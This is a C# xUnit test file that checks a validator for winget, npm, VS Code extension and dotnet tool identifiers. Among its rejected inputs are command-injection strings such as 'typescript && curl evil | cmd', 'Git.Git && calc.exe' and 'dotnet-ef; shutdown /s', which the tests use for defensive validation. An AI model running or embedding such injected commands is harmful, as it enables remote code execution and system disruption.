using DevProfile.Core;
using Xunit;

namespace DevProfile.Core.Tests;

public class LabelValidationTests
{
    [Theory]
    [InlineData("Microsoft.VisualStudioCode")]
    [InlineData("9NBLGGH4NNS1")]
    [InlineData("Notepad++.Notepad++")]
    [InlineData("Git.Git")]
    public void WingetId_Valid(string id) => Assert.True(LabelValidation.IsWingetId(id));

    [Theory]
    [InlineData("Git.Git && calc.exe")]
    [InlineData("Git.Git\" --bad")]
    [InlineData("-not-a-flag")]
    [InlineData("a|b")]
    [InlineData("")]
    public void WingetId_Invalid(string id) => Assert.False(LabelValidation.IsWingetId(id));

    [Theory]
    [InlineData("typescript")]
    [InlineData("@types/node")]
    [InlineData("@angular/cli@17.0.1")]
    [InlineData("eslint@^9.0.0")]
    public void NpmPackage_Valid(string id) => Assert.True(LabelValidation.IsNpmPackage(id));

    [Theory]
    [InlineData("typescript && curl evil | cmd")]
    [InlineData("foo;bar")]
    [InlineData("foo bar")]
    [InlineData("--registry=http://evil")]
    [InlineData("")]
    public void NpmPackage_Invalid(string id) => Assert.False(LabelValidation.IsNpmPackage(id));

    [Theory]
    [InlineData("ms-dotnettools.csharp")]
    [InlineData("esbenp.prettier-vscode")]
    [InlineData("GitHub.copilot")]
    public void VsCodeExtension_Valid(string id) => Assert.True(LabelValidation.IsVsCodeExtension(id));

    [Theory]
    [InlineData("noseparator")]
    [InlineData("pub.name & calc")]
    [InlineData("Update available: 1.92.0")]
    [InlineData("")]
    public void VsCodeExtension_Invalid(string id) => Assert.False(LabelValidation.IsVsCodeExtension(id));

    [Theory]
    [InlineData("dotnet-ef")]
    [InlineData("dotnetsay")]
    [InlineData("Cake.Tool")]
    public void DotnetToolId_Valid(string id) => Assert.True(LabelValidation.IsDotnetToolId(id));

    [Theory]
    [InlineData("dotnet-ef; shutdown /s")]
    [InlineData("a b")]
    [InlineData("")]
    public void DotnetToolId_Invalid(string id) => Assert.False(LabelValidation.IsDotnetToolId(id));
}
